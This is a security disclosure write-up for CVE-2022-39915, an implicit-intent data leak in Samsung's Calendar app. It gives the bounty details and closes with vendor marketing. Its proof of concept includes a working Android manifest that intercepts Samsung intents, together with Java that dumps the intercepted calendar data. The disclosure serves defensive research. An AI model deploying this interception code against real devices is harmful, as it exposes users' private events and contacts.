# Details

<table>
    <tr>
        <td>Name</td>
        <td>Calendar</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.calendar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.29</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39915">CVE-2022-39915</a> (SVE-2022-2389)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1990</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found use of implicit intents in the Calendar app that exposed sensitive user data. For example, in the file `com/samsung/android/app/calendar/view/invitation/SelectResponseHelper.java` an implicit intent that granted access to events, reminders, attendees, and so on to the recipient.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.email.intent.action.CALENDAR_MEETING_FORWARD" />
        <action android:name="com.samsung.android.email.intent.action.CALENDAR_PROPOSE_NEW_TIME" />
        <action android:name="com.samsung.android.mobileservice.action.ACTION_EXTERNAL_GROUP_DETAIL" />
        <action android:name="com.samsung.android.mobileservice.action.ACTION_GROUP_DETAIL" />
        <action android:name="com.samsung.android.mobileservice.action.ACTION_GROUP_EDIT" />
        <action android:name="com.samsung.android.email.intent.action.CALENDAR_MEETING_RESPONSE" />
        <action android:name="com.samsung.android.service.stplatform.ACTION_LAUNCH_CONFIGURATION_UI" />
        <action android:name="com.samsung.android.intent.action.LAUNCH_DETAIL_VIEW" />
        <action android:name="com.samsung.android.email.intent.action.CALENDAR_MEETING_RESPONSE" />
        <action android:name="com.osp.app.signin.action.ADD_SAMSUNG_ACCOUNT" />
        <action android:name="com.samsung.android.app.reminder.action.ReminderMainListView" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    DumpUtils.dump(getIntent(), getForeignClassLoader(getCallingPackage()));
    finish();
}

private ClassLoader getForeignClassLoader(String packageName) {
    try {
        return createPackageContext(packageName, CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)
                .getClassLoader();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.